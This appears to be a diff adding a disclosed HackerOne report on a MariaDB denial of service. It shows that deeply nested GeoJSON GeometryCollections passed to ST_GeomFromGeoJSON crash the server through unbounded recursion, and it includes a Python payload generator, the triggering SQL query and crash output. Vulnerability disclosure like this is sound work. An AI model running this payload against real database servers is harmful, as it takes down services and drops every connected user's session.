@@ -1,0 +1,115 @@
+{
+  "id": 3769676,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzY5Njc2",
+  "url": "https://hackerone.com/reports/3769676",
+  "title": "Stack Overflow DoS in ST_GeomFromGeoJSON Allows Any Authenticated User to Crash the Entire Server",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-29T13:59:02.972Z",
+  "submitted_at": "2026-05-29T13:59:03.905Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "byteoverride",
+    "url": "/byteoverride",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/pizbrqiplm5r84n3allf9tcukezv/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-03T22:13:55.774Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-03T22:13:55.474Z",
+  "team_member_agreed_on_going_public_at": "2026-09-03T21:38:26.531Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Any authenticated user with basic SELECT privileges can crash the entire MariaDB server process by passing a deeply nested GeoJSON GeometryCollection to `ST_GeomFromGeoJSON()`. The crash kills all active connections and requires a full server restart. The root cause is unbounded recursion in the GeoJSON parser (`sql/spatial.cc`) with zero stack overflow guards, while the equivalent JSON parsing functions have nine such guards. The WKT parser explicitly rejects nested GeometryCollection objects, confirming that the developers recognized the recursion risk but never applied the same defense to the GeoJSON code path.\n\n## Vulnerability Details\n\nMariaDB's `ST_GeomFromGeoJSON()` function parses GeoJSON input through a recursive call chain between two functions:\n\n1. `Geometry::create_from_json()` at `sql/spatial.cc:578`\n2. `Gis_geometry_collection::init_from_json()` at `sql/spatial.cc:4447`\n\nWhen a GeometryCollection contains another GeometryCollection, `init_from_json()` calls `create_from_json()` for each nested geometry (line 4474), which identifies the inner GeometryCollection and calls `init_from_json()` again. This loop repeats without limit.\n\nEach recursion level consumes roughly 300 to 500 bytes of C stack space. With the default `thread_stack` of 256KB to 1MB, approximately 650 to 2500 levels of nesting will exhaust the stack and trigger a SIGSEGV, crashing the entire `mysqld` process.\n\n### Why existing protections do not help\n\n**JSON parser depth limit (32) is bypassed.** At line 754 of `spatial.cc`, `create_from_json()` calls `json_scan_start()`, which resets the JSON engine's `stack_p` counter to 0 on every recursive call. The depth limit never accumulates.\n\n**No `check_stack_overrun()` anywhere in spatial.cc.** A grep confirms zero occurrences. Compare this with `sql/item_jsonfunc.cc`, which has nine `check_stack_overrun()` guards protecting its own recursive JSON processing.\n\n**The WKT parser blocks this exact pattern.** At `spatial.cc:4337-4341`, `Gis_geometry_collection::init_from_wkt()` explicitly rejects nested GeometryCollection with the error \"Unexpected GEOMETRYCOLLECTION\". The GeoJSON parser has no equivalent guard.\n\nThis is a textbook variant miss: the same recursion risk was identified and mitigated in two parallel code paths (JSON functions and WKT parser), but the GeoJSON parser was left unprotected.\n\n## Steps to Reproduce\n\nThis is a source code finding based on review of the MariaDB Server GitHub repository (branch: main, version 13.1.0-alpha). The vulnerable code has been present since `ST_GeomFromGeoJSON` was introduced in MariaDB 10.2.4 and affects all versions through the current development trunk.\n\n**1.** Connect to a MariaDB server as any user with SELECT privilege.\n\n**2.** Generate a deeply nested GeoJSON GeometryCollection. The following Python script produces a payload with 2000 nesting levels:\n\n```python\npayload = '{\"type\":\"Point\",\"coordinates\":[0,0]}'\nfor i in range(2000):\n    payload = '{\"type\":\"GeometryCollection\",\"geometries\":[' + payload + ']}'\nprint(payload)\n```\n\n**3.** Execute the query:\n\n```sql\nSELECT ST_GeomFromGeoJSON('<paste_nested_payload_here>');\n```\n\n**4.** The server process crashes with SIGSEGV (stack overflow). All client connections are terminated. The server must be restarted.\n\n### Code path trace\n\n```\nItem_func_geometry_from_json::val_str()        -- sql/item_geofunc.cc:175\n  -> Geometry::create_from_json()              -- sql/spatial.cc:578\n       json_scan_start(je, ...)                -- resets je->stack_p = 0 (line 754)\n       -> Gis_geometry_collection::init_from_json()  -- sql/spatial.cc:4447\n            -> create_from_json()              -- sql/spatial.cc:4474 (RECURSE)\n```\n\nZero `check_stack_overrun()` calls exist in this chain.\n\n### POC - run-poc.sh\n\n████████\n```\n=== MariaDB GeoJSON Stack Overflow PoC ===\n\n[1/7] Starting MariaDB container on port 13306...\n[2/7] Waiting for MariaDB to initialize...\n[3/7] Collecting server info...\n       Version:      12.2.2-MariaDB-ubu2404\n       thread_stack: 299008 bytes\n[4/7] Generating nested GeoJSON payload (depth=2000)...\n       Payload size: 90066 bytes\n[5/7] Copying payload into container...\nSuccessfully copied 90.1kB (transferred 91.6kB) to mariadb-poc-test:/tmp/poc.sql\n[6/7] Confirming server is alive before PoC...\n       Server is UP and responding.\n[7/7] Sending PoC payload...\n\n=== Results ===\n[+] CONFIRMED: Server crashed with SIGSEGV (exit code 139)\n\n    MariaDB Version:  12.2.2-MariaDB-ubu2404\n    thread_stack:     299008 bytes\n    Nesting depth:    2000\n    Container status: exited\n    Exit code:        139 (128 + 11 = SIGSEGV)\n\n    The entire MariaDB server process was killed.\n    All client connections would be terminated.\n\n    Crash log (last 5 lines):\n2026-05-29 13:54:55 0 [Note] Server socket created on IP: '0.0.0.0', port: '3306'.\n2026-05-29 13:54:55 0 [Note] Server socket created on IP: '::', port: '3306'.\n2026-05-29 13:54:55 0 [Note] mariadbd: Event Scheduler: Loaded 0 events\n2026-05-29 13:54:55 0 [Note] mariadbd: ready for connections.\nVersion: '12.2.2-MariaDB-ubu2404'  socket: '/run/mysqld/mysqld.sock'  port: 3306  mariadb.org binary distribution\n\nCleaning up...\nDone.\n```\n\n### Additional attack surface\n\n- **Unauthenticated via web applications:** Any application that passes user-supplied GeoJSON data to `ST_GeomFromGeoJSON()` (common in mapping and GIS applications) creates an unauthenticated attack vector against the backend database server.\n\n- **Replication cascade:** If statement-based replication (SBR) is in use, the malicious query replicates to all slaves, crashing them as well. A single query can take down an entire replication topology.\n\n## Affected Versions\n\nAll MariaDB versions from 10.2.4 (when `ST_GeomFromGeoJSON` was introduced) through 13.1.0-alpha (current development trunk). The recursive call chain in `spatial.cc` has never had stack overflow protection added.\n\n## Recommended Fix\n\nAdd `check_stack_overrun(current_thd, STACK_MIN_SIZE, NULL)` at the entry of `Gis_geometry_collection::init_from_json()` (line 4447 of `sql/spatial.cc`), matching the pattern used throughout `sql/item_jsonfunc.cc`. Alternatively, or additionally, reject nested GeometryCollection in the GeoJSON path the same way the WKT path does at lines 4337-4341.\n\n## Supporting Evidence\n\n| Evidence | Location |\n|----------|----------|\n| Recursive call chain | `spatial.cc:578` -> `spatial.cc:4474` -> `spatial.cc:578` |\n| Zero stack guards in spatial.cc | `grep -c \"check_stack_overrun\" sql/spatial.cc` returns 0 |\n| Nine stack guards in JSON functions | `grep -c \"check_stack_overrun\" sql/item_jsonfunc.cc` returns 9 |\n| WKT path blocks nested GeometryCollection | `spatial.cc:4337-4341` |\n| json_scan_start resets depth counter | `json_lib.c:867` sets `stack_p = 0` |\n\n## Impact\n\nA single authenticated user with the most basic privilege level (SELECT) can crash the entire MariaDB server with one query. This is not a per-connection crash. MariaDB uses a single-process, multi-threaded architecture, so a stack overflow in any thread kills the entire `mysqld` process. Every connected client loses their session. Uncommitted transactions are rolled back. The server requires a manual restart (or automatic restart via systemd, but with a downtime window).\n\nThe attack payload is small (under 1MB for 2000 nesting levels) and can be repeated immediately after the server restarts, enabling sustained denial of service.",
+  "weakness": {
+    "id": 4,
+    "name": "Stack Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-03T21:38:26.832Z",
+  "allow_singular_disclosure_after": 2581235.259513572,
+  "singular_disclosure_allowed": false,
+  "vote_count": 1,
+  "voters": [
+    "2026"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 10337,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors  - Denial of Service",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
